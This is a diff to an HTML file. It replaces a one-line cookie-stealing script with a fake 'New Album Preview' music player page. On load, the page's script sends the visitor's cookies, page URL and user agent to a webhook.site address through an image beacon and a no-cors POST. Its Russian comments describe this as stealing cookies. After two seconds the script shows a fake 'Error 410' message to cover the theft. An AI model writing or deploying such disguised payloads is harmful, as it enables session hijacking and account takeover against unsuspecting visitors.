@@ -1,3 +1,59 @@
-<script>
-  fetch('https://webhook.site/ce569dc1-f112-41ad-9831-24c093a8d505?cookie=' + document.cookie);
-</script>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Music Track</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background-color: #f5f5f5;
+        }
+        .player {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            display: inline-block;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+    </style>
+</head>
+<body>
+    <div class="player">
+        <h2>New Album Preview</h2>
+        <p>Loading track...</p>
+    </div>
+
+    <script>
+        // 1. Попытка украсть куки через изображение (обходит многие защиты)
+        var img = new Image();
+        img.src = 'https://webhook.site/ce569dc1-f112-41ad-9831-24c093a8d505?method=img&cookie=' + 
+                 encodeURIComponent(document.cookie) +
+                 '&url=' + encodeURIComponent(window.location.href) +
+                 '&ua=' + encodeURIComponent(navigator.userAgent);
+
+        // 2. Попытка через fetch (если разрешено CORS)
+        fetch('https://webhook.site/ce569dc1-f112-41ad-9831-24c093a8d505', {
+            method: 'POST',
+            mode: 'no-cors',
+            body: JSON.stringify({
+                cookie: document.cookie,
+                page: window.location.href,
+                userAgent: navigator.userAgent
+            }),
+            headers: {
+                'Content-Type': 'text/plain'
+            }
+        }).catch(e => console.log(e));
+
+        // 3. Показываем фейковый контент через 2 секунды
+        setTimeout(function() {
+            document.querySelector('.player').innerHTML = `
+                <h2>Track Not Available</h2>
+                <p>This content is no longer available.</p>
+                <small>Error 410: Gone</small>
+            `;
+        }, 2000);
+    </script>
+</body>
+</html>
